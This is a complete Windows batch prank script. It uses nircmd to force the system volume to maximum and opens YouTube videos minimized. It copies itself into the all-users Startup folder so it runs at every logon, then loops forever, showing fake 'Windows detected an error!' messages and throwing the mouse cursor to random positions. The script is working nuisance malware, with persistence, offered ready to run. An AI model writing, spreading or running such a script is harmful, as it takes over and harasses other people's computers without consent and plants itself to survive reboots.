@echo off

nircmd.exe mutesysvolume 0
nircmd.exe changesysvolume 65535

start /min https://www.youtube.com/watch?v=gzOzqnJWg8o&autoplay=1&loop=1&controls=0&showinfo=0
ping -n 30 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

start /min https://www.youtube.com/watch?v=Zh-Tn7pS8Sw&autoplay=1&loop=1&controls=0&showinfo=0
nircmd.exe changesysvolume 65535

if not exist "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mouhahah.bat" (
  copy /y "%~f0" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)

:loop
start /min https://www.youtube.com/watch?v=2ZIpFytCSVc&autoplay=1  :: BRUH
ping -n 3 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

start /min https://www.youtube.com/watch?v=VLP_tnnDGSQ&autoplay=1 :: Phone Lin Ling
ping -n 10 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

start /min https://www.youtube.com/shorts/-l4VvfAguUo&autoplay=1&loop=1&controls=0&showinfo=0 :: I am Steve
ping -n 7 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

msg * "Windows detected an error!"
ping -n 4 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

msg * "what are you doing to me!"
ping -n 10 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

msg * "why!"
ping -n 12 127.0.0.1 > nul
nircmd.exe changesysvolume 65535

nircmd.exe setcursor %random% %random%  
ping -n 1 127.0.0.1 > nul
nircmd.exe setcursor %random% %random%  
ping -n 1 127.0.0.1 > nul

goto loop

exit
